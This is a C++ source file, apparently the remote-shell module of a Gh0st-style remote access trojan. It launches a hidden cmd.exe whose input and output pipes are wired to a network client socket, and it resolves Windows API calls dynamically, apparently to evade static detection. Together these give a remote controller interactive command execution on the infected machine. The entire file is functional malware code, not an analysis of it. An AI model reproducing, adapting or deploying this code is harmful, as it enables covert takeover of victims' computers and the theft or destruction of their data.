// ShellManager.cpp: implementation of the CShellManager class.
//
//////////////////////////////////////////////////////////////////////

#include "ShellManager.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
typedef UINT (WINAPI *GetSystemDirectoryAT)
(
    __out_ecount_part_opt(uSize, return + 1) LPSTR lpBuffer,
    __in UINT uSize
    );
typedef BOOL (WINAPI *CreatePipeT)
(
    __out_ecount_full(1) PHANDLE hReadPipe,
    __out_ecount_full(1) PHANDLE hWritePipe,
    __in_opt LPSECURITY_ATTRIBUTES lpPipeAttributes,
    __in     DWORD nSize
    );

CreatePipeT pCreatePipe = (CreatePipeT)GetProcAddress(LoadLibrary("kernel32.dll"),"CreatePipe");
CShellManager::CShellManager(CClientSocket *pClient):CManager(pClient)
{
	GetSystemDirectoryAT pGetSystemDirectoryA= (GetSystemDirectoryAT)GetProcAddress(LoadLibrary("kernel32.dll"),"GetSystemDirectoryA");

    SECURITY_ATTRIBUTES  sa = {0};  
	STARTUPINFO          si = {0};
	PROCESS_INFORMATION  pi = {0}; 
	char  strShellPath[MAX_PATH] = {0};

    m_hReadPipeHandle	= NULL;
    m_hWritePipeHandle	= NULL;
	m_hReadPipeShell	= NULL;
    m_hWritePipeShell	= NULL;
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL; 
    sa.bInheritHandle = TRUE;

	
    if(!pCreatePipe(&m_hReadPipeHandle, &m_hWritePipeShell, &sa, 0))
	{
		if(m_hReadPipeHandle != NULL)	CloseHandle(m_hReadPipeHandle);
		if(m_hWritePipeShell != NULL)	CloseHandle(m_hWritePipeShell);
		return;
    }

    if(!pCreatePipe(&m_hReadPipeShell, &m_hWritePipeHandle, &sa, 0)) 
	{
		if(m_hWritePipeHandle != NULL)	CloseHandle(m_hWritePipeHandle);
		if(m_hReadPipeShell != NULL)	CloseHandle(m_hReadPipeShell);
		return;
    }

	memset((void *)&si, 0, sizeof(si));
    memset((void *)&pi, 0, sizeof(pi));

	GetStartupInfo(&si);
	si.cb = sizeof(STARTUPINFO);
    si.wShowWindow = SW_HIDE;
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput  = m_hReadPipeShell;
    si.hStdOutput = si.hStdError = m_hWritePipeShell; 

	pGetSystemDirectoryA(strShellPath, MAX_PATH);
	strcat(strShellPath,"\\cmd.exe");

	if (!CreateProcess(strShellPath, NULL, NULL, NULL, TRUE, 
		NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi)) 
	{
		CloseHandle(m_hReadPipeHandle);
		CloseHandle(m_hWritePipeHandle);
		CloseHandle(m_hReadPipeShell);
		CloseHandle(m_hWritePipeShell);
		return;
    }
	m_hProcessHandle = pi.hProcess;
	m_hThreadHandle	= pi.hThread;

	BYTE	bToken = TOKEN_SHELL_START;
	Send((LPBYTE)&bToken, 1);
	WaitForDialogOpen();
	m_hThreadRead = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReadPipeThread, (LPVOID)this, 0, NULL);
	m_hThreadMonitor = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorThread, (LPVOID)this, 0, NULL);
}
typedef BOOL (WINAPI *DisconnectNamedPipeT)
(
    __in HANDLE hNamedPipe
    );
DisconnectNamedPipeT pDisconnectNamedPipe = (DisconnectNamedPipeT)GetProcAddress(LoadLibrary("kernel32.dll"),"DisconnectNamedPipe");
typedef BOOL (WINAPI *TerminateProcessT)
(
    __in HANDLE hProcess,
    __in UINT uExitCode
    );
TerminateProcessT pTerminateProcess = (TerminateProcessT)GetProcAddress(LoadLibrary("kernel32.dll"),"TerminateProcess");
CShellManager::~CShellManager()
{
	TerminateThread(m_hThreadRead, 0);
	pTerminateProcess(m_hProcessHandle, 0);
	TerminateThread(m_hThreadHandle, 0);
	WaitForSingleObject(m_hThreadMonitor, 2000);
	TerminateThread(m_hThreadMonitor, 0);

	if (m_hReadPipeHandle != NULL)
		pDisconnectNamedPipe(m_hReadPipeHandle);
	if (m_hWritePipeHandle != NULL)
		pDisconnectNamedPipe(m_hWritePipeHandle);
	if (m_hReadPipeShell != NULL)
		pDisconnectNamedPipe(m_hReadPipeShell);
	if (m_hWritePipeShell != NULL)
		pDisconnectNamedPipe(m_hWritePipeShell);

    CloseHandle(m_hReadPipeHandle);
    CloseHandle(m_hWritePipeHandle);
    CloseHandle(m_hReadPipeShell);
    CloseHandle(m_hWritePipeShell);

    CloseHandle(m_hProcessHandle);
	CloseHandle(m_hThreadHandle);
	CloseHandle(m_hThreadMonitor);
    CloseHandle(m_hThreadRead);
}

void CShellManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	if (nSize == 1 && lpBuffer[0] == COMMAND_NEXT)
	{
		NotifyDialogIsOpen();
		return;
	}
	
	unsigned long	ByteWrite;
	WriteFile(m_hWritePipeHandle, lpBuffer, nSize, &ByteWrite, NULL);
}
typedef BOOL (WINAPI *PeekNamedPipeT)
(
    __in      HANDLE hNamedPipe,
    __out_bcount_part_opt(nBufferSize, *lpBytesRead) LPVOID lpBuffer,
    __in      DWORD nBufferSize,
    __out_opt LPDWORD lpBytesRead,
    __out_opt LPDWORD lpTotalBytesAvail,
    __out_opt LPDWORD lpBytesLeftThisMessage
    );

PeekNamedPipeT pPeekNamedPipe = (PeekNamedPipeT)GetProcAddress(LoadLibrary("kernel32.dll"),"PeekNamedPipe");
DWORD WINAPI CShellManager::ReadPipeThread(LPVOID lparam)
{
	unsigned long   BytesRead = 0;
	char	ReadBuff[1024];
	DWORD	TotalBytesAvail;
	CShellManager *pThis = (CShellManager *)lparam;
	while (1)
	{
		Sleep(100);
		while (pPeekNamedPipe(pThis->m_hReadPipeHandle, ReadBuff, sizeof(ReadBuff), &BytesRead, &TotalBytesAvail, NULL)) 
		{
			if (BytesRead <= 0)
				break;
			memset(ReadBuff, 0, sizeof(ReadBuff));
			LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, TotalBytesAvail);
			ReadFile(pThis->m_hReadPipeHandle, lpBuffer, TotalBytesAvail, &BytesRead, NULL);
			// ·¢ËÍÊý¾Ý
			pThis->Send(lpBuffer, BytesRead);
			LocalFree(lpBuffer);
		}
	}
	return 0;
}

DWORD WINAPI CShellManager::MonitorThread(LPVOID lparam)
{
	CShellManager *pThis = (CShellManager *)lparam;
	HANDLE hThread[2];
	hThread[0] = pThis->m_hProcessHandle;
	hThread[1] = pThis->m_hThreadRead;
	WaitForMultipleObjects(2, hThread, FALSE, INFINITE);
	TerminateThread(pThis->m_hThreadRead, 0);
	pTerminateProcess(pThis->m_hProcessHandle, 1);
	pThis->m_pClient->Disconnect();
	return 0;
}
